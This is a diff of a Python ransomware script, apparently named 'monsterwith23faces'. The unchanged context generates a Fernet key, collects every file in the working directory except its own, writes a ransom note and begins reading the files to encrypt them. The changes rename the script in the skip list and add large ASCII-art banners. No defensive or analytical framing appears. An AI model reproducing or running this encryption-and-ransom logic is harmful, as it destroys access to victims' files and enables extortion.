@@ -12,7 +12,7 @@ key = Fernet.generate_key()
 
 
 for file in os.listdir():
-    if file == "monsterwith21faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt" or file == "run_this.sh" or file == "after_ransom_is_given_run_this.sh?raw=true":
+    if file == "monsterwith23faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt" or file == "after_ransom_is_given_run_this.sh":
         continue
     if os.path.isfile(file):
         files.append(file)
@@ -24,7 +24,6 @@ note = "Give me many bonanas."
 
 with open("ransom_note.txt", "w") as ransom_note:
     ransom_note.write(note)
-
 
 for file in files:
     with open(file, "rb") as data_for_snatch:
@@ -4301,4 +4300,49 @@ print("""                                           .""--.._
          `---'`   `'----'`
 """)
 sleep(0.1)
+print("")
+print("")
+print("")
+print("")
+print("")
+print("")
+print("")
+print("")
+print("")
+print("")
+print("")
+print("""
+                                                                                                    ._                                            ,
+                                                                                                     (`)..                                    ,.-')
+                                                                                                      (',.)-..                            ,.-(..`)         
+                                                                                                       (,.' ,.)-..                    ,.-(. `.. )                    
+                                                                                                        (,.' ..' .)-..            ,.-( `.. `.. )                     
+                                                                                                         (,.' ,.'  ..')-.     ,.-( `. `.. `.. )                      
+                                                                                                          (,.'  ,.' ,.'  )-.-('   `. `.. `.. )                       
+                                                                                                           ( ,.' ,.'    _== ==_     `.. `.. )                        
+                                                                                                            ( ,.'   _==' ~  ~  `==_    `.. )                     
+                                                                                                             \  _=='   ----..----  `==_   )                     
+                                                                                                          ,.-:    ,----___.  .___----.    -..                        
+                                                                                                      ,.-'   (   _--====_  \/  _====--_   )  `-..                 
+                                                                                                  ,.-'   .__.'`.  `-_I0_-'    `-_0I_-'  .'`.__.  `-..     
+                                                                                              ,.-'.'   .'      (          |  |          )      `.   `.-..  
+                                                                                          ,.-'    :    `___--- '`.__.    / __ \    .__.' `---___'    :   `-..      
+                                                                                        -'_________`-____________'__ \  (O)  (O)  / __`____________-'________`-     
+                                                                                                                    \ . _  __  _ . /                               
+                                                                                                                     \ `V-'  `-V' |                                 
+                                                                                                                      | \ \ | /  /                                 
+                                                                                                                       V \ ~| ~/V                                   
+                                                                                                                        |  \  /|                                    
+                                                                                                                         \~ | V                                 
+                                                                                                                          \  |                                        
+                                                                                                                           VV
+""")
+print("")
+print("")
+print("")
+print("")
+
 tprint("M0nStERwith23FacEs", "rnd-xlarge")
+print("")
+print("")
+print("")
